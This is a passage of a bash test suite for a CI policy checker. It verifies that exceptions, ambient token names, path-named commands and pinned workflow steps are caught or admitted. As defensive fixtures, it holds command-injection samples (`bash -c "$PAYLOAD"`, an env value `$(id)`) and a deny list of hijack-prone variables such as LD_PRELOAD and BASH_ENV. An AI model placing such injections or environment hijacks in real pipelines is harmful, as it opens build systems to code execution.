d=$(wfix x_rule); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["rule"]="launcher"'; expm caught "$d" 'exception' "exception: the right text under another rule waives nothing"
d=$(wfix x_second 'witness run -a environment,material -- timeout 540 bash "$@"\n'); expm caught "$d" 'witness run' "exception: a second identical witness-target text elsewhere stays a finding (an entry waives one occurrence)"
d=$(wfix x_diff 'witness run -a environment,material -- timeout 541 bash "$@"\n'); expm caught "$d" 'witness run' "exception: a different witness-target text stays a finding"
d=$(wfix x_nowhy); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["why"]=""'; expm caught "$d" 'exceptions' "exception: an empty why is an error"
d=$(wfix x_blankwhy); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["why"]="  "'; expm caught "$d" 'exceptions' "exception: a blank why is an error"
d=$(wfix x_whymiss); edit_spec "$d" 'del rows["bin/witnessed.sh"]["exceptions"][0]["why"]'; expm caught "$d" 'exceptions' "exception: an entry without a why key is an error"
d=$(wfix x_extra); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["name"]="x"'; expm caught "$d" 'exceptions' "exception: an entry with a fourth key is an error"
d=$(wfix x_badrule); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["rule"]="env"'; expm caught "$d" 'exceptions' "exception: a rule outside the closed list is an error"
d=$(wfix x_notext); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["text"]=""'; expm caught "$d" 'exceptions' "exception: an empty text is an error"
d=$(wfix x_numtext); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["text"]=540'; expm caught "$d" 'exceptions' "exception: a text that is not a string is an error"
d=$(wfix x_strentry); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"]=["timeout 540 bash"]'; expm caught "$d" 'exceptions' "exception: an entry that is not an object is an error"
d=$(wfix x_notlist); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"]={"rule":"witness-target"}'; expm caught "$d" 'exceptions' "exception: exceptions that is not a list is an error"
d=$(wfix x_dup); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append(dict(rows["bin/witnessed.sh"]["exceptions"][0]))'; expm caught "$d" 'exceptions' "exception: a duplicate entry is an error"
d=$(wfix x_unused); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("set -euo pipefail"))'; expm caught "$d" 'waives nothing' "exception: an entry whose text is in the file but waives no finding of its rule is an error"
d=$(wfix x_launch 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm ok "$d" - "exception: a launcher exception waives exec bash at its command position"
d=$(wfix x_launch2 'exec bash "$@"\nexec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm caught "$d" 'launches another program' "exception: a second exec bash stays a finding"
d=$(wfix x_eval 'sed -n 1p f\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"})'; expm caught "$d" 'sed' "exception: an evaluator exception does not waive the deny finding of the same word (separate rule)"
d=$(wfix x_eval2 'sed -n 1p f\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"] += [{"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"},D("sed -n 1p f")]'; expm ok "$d" - "exception: evaluator and deny exceptions together waive sed -n"
d=$(wfix x_deny 'curl -sf x\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm ok "$d" - "exception: a deny exception waives one bare curl"
d=$(wfix x_deny2 'curl -sf x\ncurl -sf y\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm caught "$d" 'curl' "exception: a second bare curl stays a finding"
d=$(wfix x_sname 'echo bin/helper.py\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"script-name","text":"bin/helper.py","why":"a message"})'; expm ok "$d" - "exception: a script-name exception waives a named script"
d=$(wfix x_sname2 'echo bin/helper.py\n'); expm caught "$d" 'helper.py' "exception: the same named script without the exception is refused"
d=$(wfix x_env 'echo "${PATH:=/x}"\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("echo \"${PATH:=/x}\""))'; expm caught "$d" 'PATH' "exception: no exception rule waives an env-setting finding (env_mentions is the only way)"
# (B) ambient env names
afix() { # afix NAME : witnessed.sh + a stage script that runs bin/build-admit.py (reads GH_TOKEN from its own environment) + a step that passes GH_TOKEN
  local d; d=$(wfix "$1" 'unset GH_TOKEN\n')
  printf '#!/usr/bin/env bash\nset -euo pipefail\npython3 bin/build-admit.py run\nunset GH_TOKEN\n' > "$d/bin/stage-apk.sh"
  printf '#!/usr/bin/env python3\nimport os\ntok = os.environ.get("GH_TOKEN", "")\n' > "$d/bin/build-admit.py"
  edit_spec "$d" 'rows["bin/stage-apk.sh"]={"path":"bin/stage-apk.sh","tools":["python3"],"signs":False,"runs":["bin/build-admit.py"],"reads_env":["GH_TOKEN"]}; rows["bin/witnessed.sh"]["reads_env"]=["GH_TOKEN"]; rows["bin/build-admit.py"]={"path":"bin/build-admit.py","tools":[],"signs":False,"runs":[],"reads_env":["GH_TOKEN"]}'
  printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"REQ-CHAIN-004-AC8"},{"name":"GH_TOKEN","script":"bin/witnessed.sh","why":"REQ-CHAIN-004-AC8"},{"name":"GH_TOKEN","script":"bin/stage-apk.sh","why":"REQ-CHAIN-004-AC8"}]' > "$d/.ambient.json"
  printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"
  gen "$d"; echo "$d"
}
d=$(afix y_ok); expm ok "$d" - "REQ-CHAIN-004-AC8 ambient: GH_TOKEN passed to the Witness step, listed ambient for bin/build-admit.py that the step reaches through bin/stage-apk.sh"
d=$(afix y_none); rm "$d/.ambient.json"; gen "$d"; expm caught "$d" 'GH_TOKEN' "ambient: the same step without the ambient entry is refused"
d=$(afix y_empty); printf '[]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'GH_TOKEN' "ambient: an empty ambient_env list is the same as none"
d=$(afix y_wrongscript); printf '#!/usr/bin/env python3\nimport os\ntok = os.environ.get("GH_TOKEN", "")\n' > "$d/bin/other.py"; printf '[{"name":"GH_TOKEN","script":"bin/other.py","why":"REQ-CHAIN-004-AC8"}]' > "$d/.ambient.json"; edit_spec "$d" 'rows["bin/other.py"]={"path":"bin/other.py","tools":[],"signs":False,"runs":[],"reads_env":["GH_TOKEN"]}'; expm caught "$d" 'ambient only for' "ambient: an entry whose script is not one the step runs (or reaches) is refused"
d=$(afix y_noreads); edit_spec "$d" 'del rows["bin/build-admit.py"]["reads_env"]'; expm caught "$d" 'reads_env' "ambient: the script's row without reads_env is refused"
d=$(afix y_noreads2); edit_spec "$d" 'rows["bin/build-admit.py"]["reads_env"]=["OTHER"]'; expm caught "$d" 'reads_env' "ambient: reads_env that does not list the name is refused"
d=$(afix y_noreads3); edit_spec "$d" 'rows["bin/build-admit.py"]["reads_env"]="GH_TOKEN"'; expm caught "$d" 'reads_env' "ambient: reads_env that is not a list is refused"
d=$(afix y_stalereads); printf '#!/usr/bin/env python3\nimport os\n' > "$d/bin/build-admit.py"; gen "$d"; expm caught "$d" 'reads_env' "ambient: reads_env naming a variable the script never mentions is refused"
d=$(afix y_nowhy); printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":""}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'ambient_env' "ambient: an empty why is an error"
d=$(afix y_extra); printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"x","also":"y"}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'ambient_env' "ambient: an entry with another key is an error"
d=$(afix y_notlist); printf '{"name":"GH_TOKEN"}' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'ambient_env' "ambient: ambient_env that is not a list is an error"
d=$(afix y_dup); printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"a"},{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"b"}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'ambient_env' "ambient: a duplicate entry is an error"
d=$(afix y_unlisted); printf '[{"name":"GH_TOKEN","script":"bin/nowhere.py","why":"x"}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'ambient_env' "ambient: a script that is not a listed row is an error"
for nm in PATH BASH_ENV GITHUB_TOKEN LD_PRELOAD PYTHONPATH NODE_OPTIONS; do
  d=$(afix "y_forbid_$nm"); printf '[{"name":"%s","script":"bin/build-admit.py","why":"x"}]' "$nm" > "$d/.ambient.json"
  edit_spec "$d" 'rows["bin/build-admit.py"]["reads_env"]=["'"$nm"'"]'
  printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          %s: x\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' "$nm" > "$d/.github/workflows/stage-verify.yml"
  expm caught "$d" "$nm" "ambient: the forbidden name $nm listed ambient (with reads_env) is still refused"
done
d=$(afix y_otherstep); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n      - name: other\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'GH_TOKEN' "ambient: the name declared in a second step that runs a different script (not reaching bin/build-admit.py) is refused"
d=$(afix y_secret); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ secrets.GH_PAT }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'GH_TOKEN' "ambient: an ambient name whose value is a secret is refused"
d=$(afix y_glue); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}x\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'GH_TOKEN' "ambient: an ambient name whose value is an expression glued to text is refused"
d=$(afix y_cmd); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: $(id)\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'GH_TOKEN' "ambient: an ambient name whose value is a command substitution is refused"
d=$(afix y_v); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n          V: x\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'env V is not read whole' "ambient: every OTHER declared name must still be read whole (the round-8 rule)"
d=$(afix y_unknown); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_PAT: ${{ github.token }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'GH_PAT' "ambient: a name that is not listed ambient (GH_PAT) is refused"
d=$(afix y_read); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh "$GH_TOKEN"\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "ambient: control: an ambient name that the run line also reads whole is accepted"
# (C) the path-named deny test applies at COMMAND POSITION only
cfix() { # cfix NAME 'script lines' [tools-json] [runs-json]
  local d; d=$(mk "$1"); setfile "$d" bin/c.sh "#!/usr/bin/env bash\nset -euo pipefail\n$2\n"
  edit_spec "$d" 'rows["bin/c.sh"]={"path":"bin/c.sh","tools":'"${3:-[]}"',"signs":False,"runs":'"${4:-[]}"'}'; echo "$d"
}
d=$(cfix c_goarch 'echo --go-archive archive/go'); expm ok "$d" - "AC3 argument: --go-archive archive/go (last component go is on the deny list) is an argument, accepted when no such script exists"
d=$(cfix c_cp 'cp x archive/go'); expm ok "$d" - "argument: cp x archive/go is accepted"
d=$(cfix c_awkarg 'echo archive/awk'); expm ok "$d" - "argument: archive/awk as an argument is accepted"
d=$(cfix c_sedarg 'ls dist/sed'); expm ok "$d" - "argument: dist/sed as an argument is accepted"
d=$(cfix c_awk '/bin/awk x'); expm caught "$d" 'awk' "command position: /bin/awk x stays refused"
d=$(cfix c_awk_t '/bin/awk x' '["awk"]'); expm caught "$d" 'by a path' "command position: /bin/awk x stays refused even when tools lists awk (the row governs the bare name only)"
d=$(cfix c_relawk 'archive/awk x'); expm caught "$d" 'awk' "command position: archive/awk x stays refused"
d=$(cfix c_env '/usr/bin/env x'); expm caught "$d" 'env' "command position: /usr/bin/env x stays refused"
d=$(cfix c_bash '/bin/bash bin/build-apk.sh' '["bash"]' '["bin/build-apk.sh"]'); expm caught "$d" 'by a path' "command position: /bin/bash bin/build-apk.sh stays refused even with bash in tools and the script in runs"
d=$(cfix c_quoted '"/bin/sh" x'); expm caught "$d" 'sh' "command position: a quoted /bin/sh stays refused"
d=$(cfix c_pipe 'echo a | /usr/bin/awk 1'); expm caught "$d" 'awk' "command position: a path-named command after a pipe stays refused"
d=$(cfix c_go 'archive/go build' '["go"]'); expm caught "$d" 'by a path' "command position: archive/go build stays refused even with go in tools"
d=$(cfix c_unl 'bash bin/unlisted.sh' '["bash"]'); expm caught "$d" 'unlisted.sh' "argument naming an unlisted script (bash bin/unlisted.sh) stays refused"
d=$(cfix c_src 'source bin/unlisted.sh'); expm caught "$d" 'unlisted.sh' "argument naming an unlisted script (source form) stays refused"
d=$(cfix c_arg_ext 'echo bin/unlisted.sh'); expm caught "$d" 'unlisted.sh' "argument naming an unlisted script by extension stays refused"
d=$(cfix c_exists 'echo archive/go'); mkdir -p "$d/archive"; printf '#!/bin/sh\n' > "$d/archive/go"; chmod +x "$d/archive/go"; expm caught "$d" 'archive/go' "argument naming an existing executable unlisted file (archive/go) stays refused by the script rule"
d=$(mk c_py); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport subprocess\nX = "/usr/bin/git"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expm caught "$d" 'by a path' "python listed script: a command named by a path (/usr/bin/git) is still refused as before"


# ---- PR 1b round 1: ambient leak (1), forbidden-name class (2), whole-command exception text (3), fail-closed executed paths (4), reviewed pinned step (5),
# duplicate JSON keys (6), reads_env outside comments (7), three invocations through runs (8)
# (3) the recorded text of a launcher / evaluator / script-name finding at a command position is the WHOLE simple command
d=$(wfix w_p1 'timeout 540 bash -c "$PAYLOAD"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"timeout 540","why":"x"})'; expm caught "$d" 'launches another program' "round-1 (3): timeout 540 bash -c \"\$PAYLOAD\" is a finding although an entry says timeout 540 (the entry text must be the whole command)"
d=$(wfix w_p2 'bash -c "$PAYLOAD"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"script-name","text":"bash -c","why":"x"})'; expm caught "$d" 'handed' "round-1 (3): bash -c \"\$PAYLOAD\" is a finding although an entry says bash -c"
d=$(wfix w_p3 'eval echo "$PAYLOAD"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("eval"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"evaluator","text":"eval echo","why":"x"})'; expm caught "$d" 'launches another program' "round-1 (3): eval echo \"\$PAYLOAD\" is a finding although an entry says eval echo"
d=$(wfix w_ok 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm ok "$d" - "round-1 (3): exec bash \"\$@\" is admitted by an entry whose text is the whole command"
d=$(wfix w_tail 'exec bash "$@" extra\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm caught "$d" 'launches another program' "round-1 (3): exec bash \"\$@\" extra is not admitted by the entry for exec bash \"\$@\""
d=$(wfix w_semi 'exec bash "$@"; echo hi\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"x"})'; expm ok "$d" - "round-1 (3): the command text ends at ; (the entry text is the command alone)"
d=$(wfix w_paren '(exec bash "$@")\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"x"})'; expm ok "$d" - "round-1 (3): the command text ends at a closing parenthesis"
d=$(wfix w_cont 'exec bash \\\n  "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash   \"$@\"","why":"x"})'; expm ok "$d" - "round-1 (3): a command split by a backslash-newline is named by its joined text (bash joins it with nothing inserted)"
d=$(wfix w_procsub 'exec witness run --step s --signer-fulcio-token-path <(printf %s "$t") -o out -- bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"] += [{"rule":"launcher","text":"exec witness run --step s --signer-fulcio-token-path <(printf %s \"$t\") -o out -- bash \"$@\"","why":"x"},{"rule":"witness-target","text":"bash \"$@\"","why":"x"}]'; expm ok "$d" - "round-1 (3): a command with a process substitution <( ) is one command (the parenthesis inside it does not end it)"
# (1) the ambient leak
d=$(afix z_leak1); printf 'jobs:\n  j:\n    steps:\n      - name: other\n        env:\n          GH_TOKEN: ${{ secrets.PAT }}\n        run: bash bin/build-stage.sh apk "$GH_TOKEN"\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'ambient only for' "round-1 (1): GH_TOKEN with a secret in a step running an UNRELATED listed script, with a whole read, is refused"
d=$(afix z_leak2); printf 'jobs:\n  j:\n    steps:\n      - name: other\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/build-stage.sh apk "$GH_TOKEN"\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'ambient only for' "round-1 (1): a whole read of an ambient name in a step that does not reach its script is an error"
d=$(afix z_leak3); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ secrets.PAT }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh "$GH_TOKEN"\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'plain expression' "round-1 (1): the reaching step with a secret value is refused even when the run line reads the name whole"
d=$(afix z_val1); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ inputs.tok }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-1 (1): control: an inputs.X value in the reaching step is accepted"
d=$(afix z_val2); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ matrix.k }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-1 (1): control: a matrix.X value in the reaching step is accepted"
d=$(afix z_val3); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ needs.a.outputs.b }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'plain expression' "round-1 (1): a needs.X.outputs.Y value is not a plain expression"
d=$(afix z_ord); printf 'jobs:\n  j:\n    steps:\n      - name: other\n        env:\n          V: x\n        run: bash bin/build-stage.sh apk "$V"\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-1 (1): control: an ordinary env_names name read whole in an unrelated step is accepted"
# (2) the forbidden class, by shape
for nm in GITHUB_1 RUNNER_2 NODE_3 GITHUB_ RUNNER_x path Path ld_preload LD_PRELOAD1 PYTHON3 PYTHONPATH_ BASH_FUNC_x github_token bash_env Env ps4 NODE_OPTIONS2 GIT_DIR1 lc_all; do
  d=$(afix "f_$nm"); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          %s: x\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh "$%s"\n' "$nm" "$nm" > "$d/.github/workflows/stage-verify.yml"
  expm caught "$d" 'never allowed' "round-1 (2): the env name $nm is forbidden in an ordinary step env"
  d=$(afix "g_$nm"); printf '[{"name":"%s","script":"bin/build-admit.py","why":"x"}]' "$nm" > "$d/.ambient.json"; edit_spec "$d" 'rows["bin/build-admit.py"]["reads_env"]=["'"$nm"'"]'
  printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          %s: x\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' "$nm" > "$d/.github/workflows/stage-verify.yml"
  expm caught "$d" 'ambient_env' "round-1 (2): the env name $nm is refused as an ambient_env entry (and in the step)"
done
for nm in GITHUB_1 RUNNER_2 NODE_3; do
  d=$(mk "h_$nm"); printf '["DIGESTS","V","X1","%s"]' "$nm" > "$d/.envnames.json"; gen "$d"; expm caught "$d" 'env_names' "round-1 (2): $nm in the closed env_names list is refused"
done
# (4) fail closed: a path-like word with a deny-class last component is refused wherever it is (or may be) executed
pc() { # pc NAME 'script lines' [tools-json] [runs-json] : refused with "by a path"
  local d; d=$(cfix "$1" "$2" "${3:-[]}" "${4:-[]}"); expm caught "$d" 'by a path' "round-1 (4): $2 is refused (a deny-class path that may be executed)"; }
po() { local d; d=$(cfix "$1" "$2" "${3:-[]}" "${4:-[]}"); expm ok "$d" - "round-1 (4): control: $2 is admitted (a data operand)"; }
pc q_redir1 '> out dist/sed -c x'
pc q_redir2 '2>&1 dist/sed x'
pc q_redir3 '< in dist/sed'
pc q_assign 'FOO=1 dist/sed'
pc q_find1 'find . -exec dist/sed {} \;' '["find"]'
pc q_find2 'find . -exec dist/sed {} +' '["find"]'
pc q_find3 'find . -execdir dist/sed {} +' '["find"]'
pc q_find4 'find . -ok dist/sed {} \;' '["find"]'
pc q_find5 'find . -exec archive/awk {} +' '["find"]'
pc q_xargs 'xargs dist/sed'
pc q_trap "trap 'dist/sed' EXIT" '["trap"]'
pc q_env 'env dist/sed x'
pc q_command 'command dist/sed x'
pc q_nohup 'nohup dist/sed x'
pc q_time 'time dist/sed x'
pc q_bashc "bash -c 'dist/sed x'" '["bash"]'
pc q_eval 'eval dist/sed'
pc q_heredoc 'bash <<EOF\ndist/sed x\nEOF' '["bash"]'
pc q_echoredir 'echo a > dist/sed x; > o dist/awk'
pc q_taropt 'tar --use-compress-program dist/sed -cf x y' '["tar"]'
pc q_for 'for f in archive/go; do :; done'
po q_ok_cp 'cp x archive/go'
po q_ok_echo 'echo --go-archive archive/go'
po q_ok_ls 'ls dist/sed'
po q_ok_mv 'mv a archive/awk'
po q_ok_sha 'sha256sum archive/go'
po q_ok_test '[ -f archive/go ]'
po q_ok_test2 'test -x dist/sed'
po q_ok_tar 'tar -cf x archive/go' '["tar"]'
po q_ok_interp 'bash bin/build-apk.sh --go-archive archive/go' '["bash"]' '["bin/build-apk.sh"]'
po q_ok_listed './bin/build-apk.sh --go-archive archive/go' '[]' '["bin/build-apk.sh"]'
# (8) repeated invocations of a listed script belong in `runs`, not in exceptions
d=$(cfix r_three './bin/build-apk.sh a\n./bin/build-apk.sh b\n./bin/build-apk.sh c' '[]' '["bin/build-apk.sh"]'); expm ok "$d" - "round-1 (8): the same listed script invoked three times is admitted through one runs row, no exception"
d=$(cfix r_three2 'bash bin/build-apk.sh a\nbash bin/build-apk.sh b\nbash bin/build-apk.sh c' '["bash"]' '["bin/build-apk.sh"]'); expm ok "$d" - "round-1 (8): bash LISTED three times is admitted through one runs row, no exception"
d=$(cfix r_three3 './bin/build-apk.sh a\n./bin/build-apk.sh b\n./bin/build-apk.sh c'); expm caught "$d" 'build-apk.sh' "round-1 (8): the same three invocations without the runs row are refused"
# (5) the reviewed pinned step
DG='echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"'
export DG
yrep() { # yrep DIR OLD NEW : replace one text in the pinned-step stage file
  python3 -c 'import sys;p=sys.argv[1]+"/.github/workflows/stage-build.yml";t=open(p).read();assert sys.argv[2] in t;open(p,"w").write(t.replace(sys.argv[2],sys.argv[3],1))' "$@"; }
pfix() { # pfix NAME : a stage file with the AC2 digests step and its pinned_steps entry (the one ratified tuple)
  local d; d=$(mk "$1")
  printf 'jobs:\n  assemble:\n    runs-on: ubuntu-24.04\n    steps:\n      - id: digests\n        name: expose digests.json as the stage output\n        run: %s\n' "$DG" > "$d/.github/workflows/stage-build.yml"
  python3 -c 'import json,os,sys;json.dump([{"file":".github/workflows/stage-build.yml","job":"assemble","id":"digests","run":os.environ["DG"],"why":"REQ-CHAIN-004-AC2"}],open(sys.argv[1]+"/.pinned.json","w"))' "$d"
  gen "$d"; echo "$d"
}
d=$(pfix s_ok); expm ok "$d" - "round-1 (5) REQ-CHAIN-004-AC2: the digests step (id digests, echo of jq -c . digests.json to GITHUB_OUTPUT) is admitted with its pinned_steps entry"
d=$(pfix s_none); rm "$d/.pinned.json"; gen "$d"; expm caught "$d" 'GITHUB_OUTPUT' "round-1 (5): the same step without an entry is refused"
d=$(pfix s_char); yrep "$d" 'digests.json)' 'digest.json)'; expm caught "$d" 'pinned' "round-1 (5): the step text changed by one character is refused"
d=$(pfix s_redir); yrep "$d" '"$GITHUB_OUTPUT"' '"$GITHUB_OUTPUT" > x'; expm caught "$d" 'pinned' "round-1 (5): the step with a second redirection appended is refused"
d=$(pfix s_id); yrep "$d" 'id: digests' 'id: digest'; expm caught "$d" 'GITHUB_OUTPUT' "round-1 (5): the step with another id is refused"
d=$(pfix s_job); yrep "$d" '  assemble:' '  k:'; expm caught "$d" 'GITHUB_OUTPUT' "round-1 (5): the step in another job is refused"
d=$(pfix s_file); mv "$d/.github/workflows/stage-build.yml" "$d/.github/workflows/stage-reproducibility.yml"; printf 'jobs: {}\n' > "$d/.github/workflows/stage-build.yml"; expm caught "$d" 'GITHUB_OUTPUT' "round-1 (5): the step in another file is refused (and the entry for the first file is stale)"
d=$(pfix s_key); yrep "$d" 'as the stage output' 'as the stage output
        shell: bash'; expm caught "$d" 'pinned' "round-1 (5): a pinned step with another key (shell) is refused"
d=$(pfix s_env); yrep "$d" 'as the stage output' 'as the stage output
        env:
          V: x'; expm caught "$d" 'pinned' "round-1 (5): a pinned step with an env is refused"
d=$(pfix s_runner); yrep "$d" 'runs-on: ubuntu-24.04' 'runs-on: self-hosted'; expm caught "$d" 'runs-on' "round-1 (5): the pinned step still runs under the closed runner rule"
d=$(pfix s_nowhy); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j[0]["why"]=" ";json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): a blank why is an error"
d=$(pfix s_dup); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j.append(dict(j[0]));json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): a duplicate entry is an error"
d=$(pfix s_dup2); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));k=dict(j[0]);k["run"]="echo x";j.append(k);json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): two entries for one (file, job, id) are an error"
d=$(pfix s_stale); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j[0]["run"]+="x";json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): an entry whose run text is not the step's is stale"
d=$(pfix s_nofile); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j[0]["file"]=".github/workflows/stage-nowhere.yml";json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): an entry for a file that is not in the tree is an error"
d=$(pfix s_nonstage); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j[0]["file"]=".github/workflows/ci.yml";json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): an entry for a file that is not a stage file is an error"
d=$(pfix s_nl); python3 -c 'import json,sys;p=sys.argv[1]+"/.pinned.json";j=json.load(open(p));j[0]["run"]+="\necho x";json.dump(j,open(p,"w"))' "$d"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): a run text of more than one line is an error"
